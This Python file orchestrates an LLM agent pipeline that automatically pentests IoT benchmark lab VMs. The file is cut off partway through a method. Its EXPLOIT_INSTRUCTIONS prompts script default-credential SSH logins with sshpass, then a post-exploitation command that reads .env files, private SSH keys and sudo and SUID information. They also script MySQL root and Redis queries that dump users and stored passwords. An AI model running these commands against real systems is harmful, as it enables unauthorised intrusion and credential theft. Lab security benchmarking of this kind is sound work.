"""Pipeline orchestrator — executes agents in phase sequence."""
from __future__ import annotations

import json
import logging
import re
import subprocess
from collections.abc import Callable
from datetime import datetime
from pathlib import Path

import yaml

from src.agent.registry import AGENTS, AgentConfig
from src.agent.provider import LLMProvider
from src.agent.prompt_manager import load_prompt
from src.agent.cost_tracker import CostTracker
from src.agent.tools.graph_tools import (
    GRAPH_TOOLS,
    load_lab_context,
    load_discovery_context,
    get_attack_surface,
    get_risk_scores,
    get_device_info,
)
from src.agent.tools.recon_tools import RECON_TOOLS
from src.agent.tools.deliverable import DELIVERABLE_TOOLS, set_output_dir, _extract_json
from src.agent.tools.skill_tools import SKILL_TOOLS, get_skills_metadata, set_skill_filter
from src.agent.scanner import run_scanner
from src.agent.validators import VALIDATORS

log = logging.getLogger(__name__)
OUTPUT_DIR = Path("output/agent")

def _build_intrusion_tools() -> list[dict]:
    """Extract ssh_exec and try_credential from RECON_TOOLS for the intrusion group."""
    _intrusion_names = {"ssh_exec", "try_credential"}
    return [t for t in RECON_TOOLS if t["name"] in _intrusion_names]


TOOL_GROUPS: dict[str, list[dict]] = {
    "graph": GRAPH_TOOLS,
    "recon": RECON_TOOLS,
    "deliverable": DELIVERABLE_TOOLS,
    "skill": SKILL_TOOLS,
    "intrusion": _build_intrusion_tools(),
}

# ---------------------------------------------------------------------------
# Phase 4 exploit micro-agents: per-category instructions.
# Vuln-type taxonomy lives in src/agent/vuln_taxonomy.py so the evaluator
# can share the same aliasing.
# ---------------------------------------------------------------------------

from src.agent.vuln_taxonomy import (
    canonicalize,
    exploit_category,
    is_config_only,
    is_noise,
)

EXPLOIT_INSTRUCTIONS: dict[str, str] = {
    "credentials": (
        "Test default credentials on this service. Match the tool to the SERVICE type.\n\n"
        "For SSH (port 22) — try these pairs in order, stop at FIRST successful login:\n"
        "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
        "  2. ssh_login(\"sshpass -p root ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc root@{ip} 'id'\")\n"
        "  3. ssh_login(\"sshpass -p ubnt ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc ubnt@{ip} 'id'\")\n"
        "  4. ssh_login(\"sshpass -p raspberry ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc pi@{ip} 'id'\")\n\n"
        "If ANY login succeeds (return_code=0), run a SINGLE post-exploitation command:\n"
        "  ssh_login(\"sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@{ip} "
        "'echo === IDENTITY === && id && "
        "echo === CREDENTIALS === && "
        "(cat /etc/iot/config.json 2>/dev/null || echo no-config) && "
        "(cat /home/*/.env 2>/dev/null || echo no-env) && "
        "echo === SSH_KEYS === && "
        "(ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || echo no-ssh-keys) && "
        "echo === NETWORK === && "
        "(ip addr show 2>/dev/null || ifconfig 2>/dev/null) && "
        "echo === PRIVESC === && "
        "(sudo -l 2>/dev/null || echo no-sudo) && "
        "(find / -perm -4000 -type f 2>/dev/null | head -5 || echo no-suid)'\")\n\n"
        "For MySQL — try root with empty password:\n"
        "  mysql_query(host=\"{ip}\", user=\"root\", "
        "query=\"SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;\")\n\n"
        "Report ALL data retrieved in data_extracted field.\n\n"
        "For MySQL/MariaDB (port 3306) — try root with empty password:\n"
        "  mysql_query(host=\"{ip}\", user=\"root\", "
        "query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\")\n\n"
        "For MQTT (port 1883) — test weak credentials (use Phase 3 evidence for hints):\n"
        "  mqtt_listen(broker=\"{ip}\", topic=\"#\", count=5, timeout=5, username=\"test\", password=\"test\")\n"
        "  If that fails (return_code=5), try: username=\"admin\", password=\"admin\"\n"
        "  If that fails, try: username=\"mqtt\", password=\"mqtt\"\n\n"
        "For SNMP (port 161) — test default community strings:\n"
        "  nmap_scan(target=\"{ip}\", ports=\"161\", scripts=\"snmp-brute\", "
        "skip_discovery=True, udp_scan=True)\n\n"
        "For Redis (port 6379) — Redis rarely has credentials by default:\n"
        "  redis_cmd(host=\"{ip}\", command=\"KEYS *\")\n"
        "  If that works, extract sensitive keys: redis_cmd(host=\"{ip}\", command=\"GET config:db_password\")\n"
    ),
    "data_access": (
        "Access the service and retrieve actual data to prove impact. "
        "Match the tool to the SERVICE type from Phase 3 evidence.\n\n"
        "IMPORTANT: The Phase 3 evidence already contains the exact URLs/paths to use. "
        "Read the evidence field and use those EXACT URLs — do NOT invent paths.\n\n"
        "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) "
        "— capture messages, extract credentials/keys\n"
        "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. "
        "If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\n"
        "For HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) "
        "for each listed file\n"
        "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n"
        "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", "
        "query=\"SHOW DATABASES;\") — show data\n"
        "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n"
        "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") "
        "then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n"
        "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then "
        "http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n"
        "For CoAP (port 5683): nmap_scan(target=\"{ip}\", ports=\"5683\", "
        "skip_discovery=True, udp_scan=True) — confirm port open\n"
        "For misconfiguration/insecure_protocol: use the tool that matches the service in evidence\n\n"
        "If the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already "
        "captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure."
    ),
    "injection": (
        "Attempt code execution or unauthorized upload/firmware access.\n\n"
        "For file upload (web_upload role, port 80): "
        "http_get(\"http://{ip}/uploads/\") to check for uploaded files, "
        "then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
        "For firmware update without signature (iot_gateway, port 80): "
        "http_get(\"http://{ip}/firmware/\") to list firmware files, "
        "then http_get(\"http://{ip}/update\") to test update endpoint\n"
        "For Node-RED RCE (nodered_server, port 1880): "
        "http_get(\"http://{ip}:1880/flows\") to access flow definitions\n"
        "For web API RCE (web_server_v2, port 80): "
        "http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n\n"
        "Report what is accessible and whether code execution is possible."
    ),
}


def _get_git_commit() -> str | None:
    """Return the short hash of the current git commit, or None if unavailable."""
    try:
        result = subprocess.run(
            ["git", "rev-parse", "--short", "HEAD"],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception:
        pass
    return None


def _exploit_relpath(device_id: str, vuln_type: str, vuln_id: str) -> Path:
    """Relative path of a per-vuln Phase 4 exploit deliverable under the run dir."""
    safe_vuln_id = vuln_id.replace("/", "_")
    return Path("04_exploits") / device_id / f"{vuln_type}_{safe_vuln_id}.json"


def _make_test_entry(
    vuln: dict,
    *,
    status: str,
    result: dict | None = None,
    evidence: str | None = None,
    evidence_level: int | None = None,
) -> dict:
    """Build an aggregated test entry for 04_exploitation.json.

    Fields are pulled from `result` (Phase 4 output) when present, otherwise
    from `vuln` (Phase 3 finding). `status`, `evidence` and `evidence_level`
    can be overridden by explicit kwargs for the parse-error and pass-through
    branches.
    """
    result = result or {}
    return {
        "vuln_id": vuln.get("id", "VULN-???"),
        "device_id": result.get("device_id") or vuln.get("device_id", "unknown"),
        "device_ip": result.get("device_ip") or vuln.get("device_ip", ""),
        "vuln_type": result.get("vuln_type") or vuln.get("type", ""),
        "severity": result.get("severity") or vuln.get("severity", "MEDIUM"),
        "status": status,
        "evidence": (
            evidence if evidence is not None
            else (result.get("evidence") or vuln.get("evidence", ""))
        ),
        "evidence_level": (
            evidence_level if evidence_level is not None
            else result.get("evidence_level", 1)
        ),
        "tool_used": result.get("tool_used", ""),
        "data_extracted": result.get("data_extracted", []),
        "description": result.get("description") or vuln.get("details", ""),
        "cve_ids": vuln.get("cve_ids", []),
    }


class Pipeline:
    """Multi-phase agent pipeline with deliverable passing and cost tracking."""

    def __init__(
        self,
        provider: LLMProvider,
        dry_run: bool = False,
        phases: list[int] | None = None,
        scenario_id: int | str | None = None,
        auto_teardown: bool = True,
        max_cost_usd: float | None = None,
        phase_models: dict[int | str, str] | None = None,
        custom_config: dict | None = None,  # {architecture, posture, selected_packs, excluded_vulns}
        target_network: str | None = None,  # CIDR for Docker discovery mode e.g. "192.168.1.0/24"
    ):
        self.provider = provider
        self.dry_run = dry_run
        self.phases = phases
        self.scenario_id = scenario_id
        self.auto_teardown = auto_teardown
        self.max_cost_usd = max_cost_usd
        self.phase_models = phase_models or {}
        self.custom_config = custom_config
        self.target_network = target_network
        self.tracker = CostTracker(model=provider.model)
        self.context: dict = {}

        # Create timestamped run directory
        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
        self.run_dir = OUTPUT_DIR / timestamp
        self.run_dir.mkdir(parents=True, exist_ok=True)
        self.git_commit = _get_git_commit()

        # Point deliverable tools and validators at this run dir
        set_output_dir(self.run_dir)
        import src.agent.validators as val_mod
        val_mod.OUTPUT_DIR = self.run_dir

    def run(
        self,
        stream_callback: Callable[[dict], None] | None = None,
        stop_event=None,
    ) -> dict[str, str]:
        """Execute the full pipeline. Returns {agent_name: status} dict.

        Args:
            stream_callback: Optional callback for real-time events.
                Event types: pipeline_start, phase_start, text_chunk, tool_call,
                tool_result, turn_done, phase_done, pipeline_done.
        """
        # Load lab context — discovery mode, scenario topology, or physical lab
        if self.target_network is not None:
            from src.agent.tools.graph_tools import load_discovery_context
            lab = load_discovery_context(self.target_network)
            target_subnet = self.target_network
        elif self.scenario_id is not None:
            from src.agent.tools.graph_tools import load_scenario_topology
            lab = load_scenario_topology(self.scenario_id)
            target_subnet = "192.168.100.0/24"
        else:
            lab = load_lab_context()
            target_subnet = "192.168.88.0/24"
        self.context = {
            "device_count": str(lab["device_count"]),
            "link_count": str(lab["link_count"]),
            "cve_count": str(lab["cve_count"]),
            "top_risk": str(lab["top_risk"]),
            "target_subnet": target_subnet,
            "scenario_context": "",
            "network_topology_edges": "",
        }

        # Build compact edge list from whatever topology is available
        from src.agent.tools.graph_tools import _scenario_topology as _st, _backend as _bk
        if _st is not None:
            edges = _st.get("edges", [])
            self.context["network_topology_edges"] = "\n".join(
                f"  {e['source']} -> {e['target']}" for e in edges
            )
            # Pre-compute nmap_scan groups by role so Phase 2 doesn't have to guess
            self.context["nmap_scan_groups"] = self._build_nmap_groups(_st.get("nodes", []))
        elif _bk is not None:
            try:
                topo = _bk.to_dict()
                edges = topo.get("edges", [])
                self.context["network_topology_edges"] = "\n".join(
                    f"  {e.get('source', e.get('from', '?'))} -> {e.get('target', e.get('to', '?'))}"
                    for e in edges
                )
            except Exception:
                pass
        if "nmap_scan_groups" not in self.context:
            self.context["nmap_scan_groups"] = ""

        print("Loading lab context...")
        print(
            f"  Devices: {lab['device_count']}, Links: {lab['link_count']}, "
            f"CVEs: {lab['cve_count']}, Top risk: {lab['top_risk']}"
        )

        # Save run metadata (git commit, model) for traceability
        run_meta = {
            "model": getattr(self.provider, "model", None),
            "git_commit": self.git_commit,
        }
        (self.run_dir / "run_meta.json").write_text(json.dumps(run_meta, indent=2))

        if stream_callback:
            stream_callback({
                "type": "pipeline_start",
                "device_count": lab["device_count"],
                "link_count": lab["link_count"],
                "cve_count": lab["cve_count"],
                "top_risk": lab["top_risk"],
            })

        # Load benchmark scenario context if specified
        if self.scenario_id is not None:
            scenario_context = self._load_scenario_context(self.scenario_id)
            if scenario_context:
                self.context["scenario_context"] = scenario_context
                print(f"  Benchmark scenario: S{self.scenario_id} — {scenario_context.splitlines()[0]}")

            # Save scenario metadata for evaluator
            meta = {
                "scenario_id": self.scenario_id,
                "run_dir": str(self.run_dir),
                "model": getattr(self.provider, "model", None),
                "git_commit": self.git_commit,
            }
            if self.custom_config:
                meta["custom_config"] = self.custom_config
            (self.run_dir / "scenario_meta.json").write_text(json.dumps(meta, indent=2))

            # Copy ground truth into run directory for traceability
            self._save_ground_truth()

            # Deploy benchmark VMs before starting the pipeline
            if not self.dry_run:
                deploy_ok = self._run_scenario_deploy(stream_callback)
                if not deploy_ok:
                    if stream_callback:
                        stream_callback({"type": "pipeline_done", "results": {}, "total_cost_usd": 0, "run_dir": str(self.run_dir)})
                    return {}

        # Get agents sorted by phase
        agents = sorted(AGENTS.values(), key=lambda a: a.phase)
        if self.phases:
            agents = [a for a in agents if a.phase in self.phases]

        results: dict[str, str] = {}

        for agent_config in agents:
            # Switch provider/model if specific model set for this phase
            phase_num = agent_config.phase
            # Handle keys from JSON as strings or ints
            target_model = self.phase_models.get(phase_num) or self.phase_models.get(str(phase_num))
            if target_model and target_model != self.provider.model:
                # MiniMax Coding Plan slugs are bare names ("MiniMax-M2.7"); OpenRouter
                # slugs are namespaced ("openrouter_vendor/model-name"). Infer provider
                # from the presence of a slash so multi-model mode supports both.
                target_provider = "minimax" if "/" not in target_model else "openrouter"
                log.info("Switching to phase %d specific model: %s (%s)", phase_num, target_model, target_provider)
                self.provider = LLMProvider(provider=target_provider, model=target_model)
                self.tracker.model = target_model

            # Honour stop request between phases
            if stop_event and stop_event.is_set():
                log.info("Pipeline stop requested — halting before phase %d", agent_config.phase)
                if stream_callback:
                    stream_callback({"type": "error", "message": "Pipeline arrêté par l'utilisateur"})
                break

            # Check prerequisites
            if not self._check_prerequisites(agent_config, results):
                log.warning("Skipping %s: prerequisites not met", agent_config.name)
                results[agent_config.name] = "skipped:prerequisites"
                continue

            # Check conditional execution
            if not self._check_conditional(agent_config):
                log.info(
                    "Skipping %s: conditional check failed (empty queue)",
                    agent_config.name,
                )
                results[agent_config.name] = "skipped:conditional"
                continue

            # Pre-generate context files before certain phases
            if agent_config.phase == 5:
                self._generate_intrusion_context()
            if agent_config.phase == 6:
                self._generate_phase6_context()
                self._pregenerate_report_sections()

            # Run the agent — catch Phase 6 errors so teardown always runs.
            if agent_config.phase == 6:
                try:
                    status = self._run_agent(agent_config, stream_callback)
                except Exception as exc:
                    log.warning("Phase 6 agent error (non-fatal): %s", exc)
                    status = "error"
                finally:
                    self._merge_report_with_prefill()
            else:
                status = self._run_agent(agent_config, stream_callback)

            results[agent_config.name] = status

            # After Phase 2 in discovery mode, infer topology links via traceroute
            if agent_config.phase == 2 and self.target_network:
                self._infer_topology_links(stream_callback)

            # After Phase 5 (intrusion), emit hop events for frontend topology coloring
            if agent_config.phase == 5:
                self._emit_intrusion_events(stream_callback)

            # Enforce budget limit after each phase
            if self.max_cost_usd is not None and self.tracker.total_cost() >= self.max_cost_usd:
                log.warning(
                    "Budget limit reached ($%.4f >= $%.4f) — stopping pipeline",
                    self.tracker.total_cost(), self.max_cost_usd,
                )
                if stream_callback:
                    stream_callback({
                        "type": "error",
                        "message": f"Budget dépassé (${self.tracker.total_cost():.4f} ≥ ${self.max_cost_usd:.4f}) — pipeline arrêté",
                    })
                break

        # Print cost summary
        self.tracker.print_summary()

        # Save cost summary to run directory
        cost_path = self.run_dir / "cost_summary.json"
        cost_path.write_text(self.tracker.to_json(), encoding="utf-8")
        log.info("Cost summary saved to %s", cost_path)

        # Ingest run findings into ChromaDB for episodic memory
        try:
            from src.agent.knowledge.ingest import ingest_run_findings
            ingested = ingest_run_findings(self.run_dir, self.provider.model)
            if ingested:
                log.info("Ingested %d findings into run_history", ingested)
        except Exception as e:
            log.warning("Run history ingestion failed (non-fatal): %s", e)

        # Auto-teardown benchmark VMs when a scenario was deployed
        # Done BEFORE pipeline_done so the SSE connection is still open and the
        # frontend can display teardown_start/teardown_done events.
        if self.scenario_id is not None and self.auto_teardown and not self.dry_run:
            self._run_teardown(stream_callback)

        if stream_callback:
            stream_callback({
                "type": "pipeline_done",
                "results": results,
                "total_cost_usd": round(self.tracker.total_cost(), 4),
                "run_dir": str(self.run_dir),
            })

        return results

    def run_deploy_only(self, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Deploy benchmark scenario VMs without running any pentest phase.

        Runs Ansible deploy + inject + verify, then emits pipeline_done so the
        frontend closes the SSE connection cleanly.
        """
        if not self.scenario_id:
            if stream_callback:
                stream_callback({"type": "error", "message": "deploy_only requiert un scenario_id"})
                stream_callback({"type": "pipeline_done", "results": {}, "total_cost_usd": 0, "run_dir": str(self.run_dir)})
            return
        if stream_callback:
            stream_callback({"type": "pipeline_start", "device_count": 0, "link_count": 0, "cve_count": 0, "top_risk": None})
        success = self._run_scenario_deploy(stream_callback)
        if stream_callback:
            stream_callback({
                "type": "pipeline_done",
                "results": {"deploy": "completed" if success else "failed"},
                "total_cost_usd": 0,
                "run_dir": str(self.run_dir),
            })

    def _run_playbook(self, playbook: str, stream_callback, event_type_start: str, event_type_done: str, extra_msg: str = "") -> bool:
        """Run an Ansible playbook and return True on success."""
        repo_root = Path(__file__).resolve().parents[2]
        cmd = [
            "ansible-playbook",
            f"benchmarks/ansible/playbooks/{playbook}",
            "-i", "benchmarks/ansible/inventory.yml",
            "--vault-password-file", "/root/.vault_pass",
            "--extra-vars", f"scenario_id={self.scenario_id}",
        ]
        print(f"\n{'=' * 60}")
        print(f"ANSIBLE: {playbook} (scenario {self.scenario_id})")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({"type": event_type_start, "scenario_id": self.scenario_id, "playbook": playbook})

        try:
            import os
            env = os.environ.copy()
            env["LANG"] = "en_US.UTF-8"
            env["LC_ALL"] = "en_US.UTF-8"
            result = subprocess.run(cmd, cwd=str(repo_root), capture_output=True, text=True, timeout=600, env=env)
            success = result.returncode == 0
            output = (result.stdout + result.stderr)[-3000:]
            print(output)
        except subprocess.TimeoutExpired:
            success = False
            output = f"{playbook} timeout (600s)"
        except FileNotFoundError:
            success = False
            output = "ansible-playbook not found — deploy skipped"

        if stream_callback:
            stream_callback({"type": event_type_done, "scenario_id": self.scenario_id, "playbook": playbook, "success": success, "output": output})
        return success

    def _run_scenario_deploy(self, stream_callback: Callable[[dict], None] | None = None) -> bool:
        """Deploy and configure benchmark scenario VMs before pipeline starts."""
        # Pre-teardown any running scenario to avoid conflicts on shared network
        self._teardown_all_running_scenarios(stream_callback)

        # 03 — deploy VMs
        ok = self._run_playbook("03_deploy_scenario.yml", stream_callback, "deploy_start", "deploy_done")
        if not ok:
            log.error("Scenario deploy failed — aborting pipeline")
            return False
        # 04 — inject vulnerabilities
        ok = self._run_playbook("04_inject_vulns.yml", stream_callback, "inject_start", "inject_done")
        if not ok:
            log.warning("Vuln injection failed — continuing anyway")
        # 06 — verify all vulns are present before running LLM (non-blocking: warn only)
        ok_verify = self._run_playbook("06_verify.yml", stream_callback, "verify_start", "verify_done")
        if not ok_verify:
            log.warning("Vuln verification found missing vulns — pipeline will run with degraded ground truth coverage")
        return True

    def _teardown_all_running_scenarios(self, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Teardown any currently running scenario before deploying a new one."""
        repo_root = Path(__file__).resolve().parents[2]
        # Load all scenario IDs dynamically from group_vars
        import yaml as _yaml
        all_yml = repo_root / "benchmarks/ansible/group_vars/all/main.yml"
        try:
            _all_data = _yaml.safe_load(all_yml.read_text())
            scenario_ids = [int(k) for k in _all_data.get("scenario_vmid_ranges", {}).keys()]
        except Exception:
            scenario_ids = list(range(1, 11))

        # Read Proxmox host IP from inventory (single source of truth)
        proxmox_host = "192.168.88.100"
        try:
            inv_yml = repo_root / "benchmarks/ansible/inventory.yml"
            inv = _yaml.safe_load(inv_yml.read_text())
            proxmox_host = inv["all"]["hosts"]["proxmox"]["ansible_host"]
        except Exception:
            pass

        for sid in scenario_ids:
            if sid == self.scenario_id:
                continue  # Will be redeployed fresh
            # Check if any VM in this scenario's range exists
            try:
                data = _all_data
                base = data["scenario_vmid_ranges"].get(str(sid))
                if not base:
                    continue
            except Exception:
                continue
            check = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                 f"root@{proxmox_host}", f"(qm status {base} 2>/dev/null || pct status {base} 2>/dev/null) && echo EXISTS || true"],
                capture_output=True, text=True, timeout=10,
            )
            if "EXISTS" not in check.stdout:
                continue
            # Scenario is running — teardown
            log.info("Pre-teardown of running scenario S%d", sid)
            old_id = self.scenario_id
            self.scenario_id = sid
            self._run_teardown(stream_callback)
            self.scenario_id = old_id

    def _run_teardown(self, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Run 99_teardown.yml to clean up benchmark VMs after pipeline completes."""
        print(f"\n{'=' * 60}")
        print(f"TEARDOWN: Suppression du scénario S{self.scenario_id}")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({
                "type": "teardown_start",
                "scenario_id": self.scenario_id,
            })

        repo_root = Path(__file__).resolve().parents[2]
        cmd = [
            "ansible-playbook",
            "benchmarks/ansible/playbooks/99_teardown.yml",
            "-i", "benchmarks/ansible/inventory.yml",
            "--vault-password-file", "/root/.vault_pass",
            "--extra-vars", f"scenario_id={self.scenario_id}",
        ]

        try:
            result = subprocess.run(
                cmd,
                cwd=str(repo_root),
                capture_output=True,
                text=True,
                timeout=300,
            )
            success = result.returncode == 0
            output = result.stdout[-2000:] if result.stdout else result.stderr[-2000:]
            print(output)
        except subprocess.TimeoutExpired:
            success = False
            output = "Teardown timeout (300s)"
            log.error("Teardown timeout for scenario %d", self.scenario_id)
        except FileNotFoundError:
            success = False
            output = "ansible-playbook not found — teardown skipped"
            log.warning("ansible-playbook not in PATH, skipping teardown")

        if stream_callback:
            stream_callback({
                "type": "teardown_done",
                "scenario_id": self.scenario_id,
                "success": success,
                "output": output,
            })

    def _save_ground_truth(self):
        """Copy or generate ground truth into the run directory for traceability and evaluation."""
        import shutil

        gt_dest = self.run_dir / "ground_truth.yaml"

        if self.custom_config:
            # Custom mode: generate GT dynamically from selected packs/vulns
            gt = self._generate_custom_gt()
            if gt:
                gt_dest.write_text(yaml.dump(gt, default_flow_style=False, allow_unicode=True, sort_keys=False))
                log.info("Custom ground truth generated: %d vulns", len(gt.get("vulnerabilities", [])))
                return

        # Preset mode: copy existing GT file
        gt_path = Path("benchmarks/ground_truth") / f"scenario_{self.scenario_id}.yaml"
        if gt_path.exists():
            shutil.copy2(gt_path, gt_dest)
            log.info("Ground truth copied to run dir: %s", gt_dest)

    def _generate_custom_gt(self) -> dict | None:
        """Generate a ground truth from custom config (architecture + selected packs + excluded vulns)."""
        if not self.custom_config:
            return None

        architecture = self.custom_config.get("architecture")
        selected_packs = self.custom_config.get("selected_packs", [])
        excluded_vulns = set(self.custom_config.get("excluded_vulns", []))

        # Load topology
        topo_path = Path("benchmarks/topologies") / f"{architecture}.yaml"
        if not topo_path.exists():
            log.warning("Topology not found: %s", topo_path)
            return None
        topology = yaml.safe_load(topo_path.read_text())

        sid = str(self.scenario_id or "custom")
        weights = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        vulns = []
        vuln_counter = 1

        for pack_id in selected_packs:
            pack_path = Path("benchmarks/packs/definitions") / f"{pack_id}.yaml"
            if not pack_path.exists():
                continue
            pack = yaml.safe_load(pack_path.read_text())

            for svc in topology.get("services", []):
                role = svc["role"]
                pack_vulns = pack.get("vulnerabilities", {}).get(role, [])
                device_name = svc["name_template"].format(sid=sid)
                ip = svc["ip"]

                for vt in pack_vulns:
                    # Check scenario restriction
                    allowed = vt.get("scenarios")
                    if allowed and sid not in allowed:
                        continue

                    # Build vuln ID for exclusion check
                    vuln_id = f"{pack_id}__{role}__{(vt.get('title', '')).replace(' ', '_')[:40]}"
                    if vuln_id in excluded_vulns:
                        continue

                    vuln = {
                        "id": f"V{vuln_counter}",
                        "device": device_name,
                        "ip": ip,
                        "role": role,
                    }
                    for key, val in vt.items():
                        if key == "scenarios":
                            continue
                        elif key == "indicators":
                            vuln[key] = [ind.replace("{ip}", ip) for ind in val]
                        elif key == "verification":
                            vuln[key] = val.replace("{ip}", ip)
                        else:
                            vuln[key] = val
                    vulns.append(vuln)
                    vuln_counter += 1

            # Router vulns
            for vt in pack.get("vulnerabilities", {}).get("router", []):
                allowed = vt.get("scenarios")
                if allowed and sid not in allowed:
                    continue
                vuln_id = f"{pack_id}__router__{(vt.get('title', '')).replace(' ', '_')[:40]}"
                if vuln_id in excluded_vulns:
                    continue
                router = topology.get("router", {})
                vuln = {
                    "id": f"V{vuln_counter}",
                    "device": router.get("name_template", "router").format(sid=sid),
                    "ip": router.get("ip", "192.168.100.1"),
                    "role": "router",
                }
                for key, val in vt.items():
                    if key == "scenarios":
                        continue
                    elif key == "indicators":
                        vuln[key] = [ind.replace("{ip}", vuln["ip"]) for ind in val]
                    elif key == "verification":
                        vuln[key] = val.replace("{ip}", vuln["ip"])
                    else:
                        vuln[key] = val
                vulns.append(vuln)
                vuln_counter += 1

        max_score = sum(weights.get(v.get("severity", "low").lower(), 1) for v in vulns)

        return {
            "scenario_id": sid,
            "scenario_name": f"Custom — {architecture}",
            "difficulty": "custom",
            "vulnerabilities": vulns,
            "scoring": {
                "total_vulnerabilities": len(vulns),
                "weights": weights,
                "max_weighted_score": max_score,
            },
            "bonus_types": [],
        }

    def _load_scenario_context(self, scenario_id: int | str) -> str:
        """Load benchmark scenario IPs from ground_truth YAML and return a context string."""
        gt_path = Path("benchmarks/ground_truth") / f"scenario_{scenario_id}.yaml"
        if not gt_path.exists():
            log.warning("Scenario ground truth not found: %s", gt_path)
            return ""
        data = yaml.safe_load(gt_path.read_text())
        lines = [
            f"## Benchmark scenario S{scenario_id}: {data.get('scenario_name', '')}",
            f"Scan network: 192.168.100.0/24 (NOT 192.168.88.0/24 — that is the physical lab)",
            f"Gateway: 192.168.100.1 (OpenWrt router)",
            "Known target hosts (scan ALL of them):",
        ]
        router = data.get("topology", {}).get("router", {})
        if router:
            lines.append(f"  - {router.get('name', 'router')} ({router.get('ip', '192.168.100.1')}) — role: router")
        for svc in data.get("topology", {}).get("services", []):
            lines.append(f"  - {svc['name']} ({svc['ip']}) — role: {svc['role']}")
        return "\n".join(lines)

    @staticmethod
    def _strip_code_fences(text: str) -> str:
        """Strip markdown code fences (```json ... ```) from LLM fallback output."""
        text = text.strip()
        text = re.sub(r'^```(?:json)?\s*\n', '', text)
        text = re.sub(r'\n```\s*$', '', text)
        return text.strip()

    def _run_agent(self, config: AgentConfig, stream_callback: Callable[[dict], None] | None = None) -> str:
        """Run a single agent phase."""
        # Set skill filter for this phase (hard filtering)
        filter_tags = config.skill_filter.get("tags") if config.skill_filter else None
        set_skill_filter(filter_tags)

        tools = self._resolve_tools(config)

        # Build prompt variables
        variables = {**self.context}
        variables["previous_deliverables"] = self._list_previous_deliverables()
        variables["expected_deliverable"] = config.deliverable_file
        variables["available_skills"] = self._filter_skills(config)

        # Inject deliverable template if one exists
        template_path = Path(__file__).parent / "templates" / config.deliverable_file
        if template_path.exists():
            template = template_path.read_text(encoding="utf-8")
            template = template.replace("{{run_date}}", self.run_dir.name)
            template = template.replace("{{model}}", self.provider.model)
            variables["deliverable_template"] = template

        # For Phase 5: tell the LLM to leave {{SECTION_5_TABLE}} / {{SECTION_6_TABLES}}
        # as-is — Python will inject the real tables in _merge_report_with_prefill()
        # Do NOT inject the prefill into the prompt — it would make the system prompt too large.

        # Load and compose prompt
        system_prompt = load_prompt(config.prompt_template, variables)

        # Print header
        print(f"\n{'=' * 60}")
        print(f"PHASE {config.phase}: {config.name.upper()}")
        print(f"  {config.description}")
        print(f"  Tools: {config.tools}")
        print(f"  Deliverable: {config.deliverable_file}")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({
                "type": "phase_start",
                "phase": config.phase,
                "name": config.name,
                "description": getattr(config, "description", ""),
                "deliverable": config.deliverable_file,
            })

        # If this phase has device sub-agents, run scanner + LLM analysis (Phase 3a+3b)
        if config.has_device_agents:
            self._run_phase3(config, stream_callback)

        # If this phase uses deterministic aggregation, skip the LLM and merge directly
        if config.deterministic_aggregation:
            self._aggregate_device_vulns(config, stream_callback)
            validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d deterministic aggregation validated: %s", config.phase, msg)
                print(f"  Deliverable validated: {config.deliverable_file}")
            else:
                log.error("Phase %d deterministic aggregation FAILED: %s", config.phase, msg)
                print(f"  Deliverable FAILED validation: {msg}")
            if stream_callback:
